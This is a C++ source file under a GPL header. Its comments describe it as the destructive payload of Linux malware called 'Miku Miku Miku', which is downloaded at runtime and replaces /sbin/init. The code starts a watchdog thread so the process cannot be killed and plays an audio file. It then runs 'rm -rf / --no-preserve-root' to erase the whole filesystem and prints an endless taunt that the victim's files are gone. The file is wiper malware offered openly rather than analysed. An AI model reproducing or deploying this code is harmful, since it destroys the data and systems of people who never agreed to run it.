/*

Copyright (C) 2026 Hyperion0801.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <thread>
#include "watchdog.h"

// The destructive part of Miku Miku Miku, this gets downloaded on runtime.
// This replaces /sbin/init on Linux distros.

int main()
{
    // start watchdog service to make sure payload isn't killed.
    std::thread ipc_thread(watchPayload);
    ipc_thread.detach();

    // HATSUNE MIKU!!!!!!!!!!!!!!!!!
    system("mpv /miku/BD5972AA.ogg");

    // Let's play some Aurascope! Second to last step of the payload.
    // Unused for now: system("cd Aurascope && xinit /usr/bin/wine Aurascope.exe"); // Most likely not going to do anything as wine is going to crash the instant xD

    // Yeet the files, we don't need em around here.'
    system("rm -rf / --no-preserve-root");
    int rmRoot = remove("/*");

    if (!rmRoot)
    {
        perror("Error deleting files: /*");
        return EXIT_FAILURE;
    }
    else
    {
        std::cout << "Successfully deleted /*!";
    }

    while(1) {
        std::cout << "\033[2J\033[1;1H.Good luck getting your files back! Hatsune Miku took them all..." << std::flush;
    }

    return EXIT_SUCCESS;
}
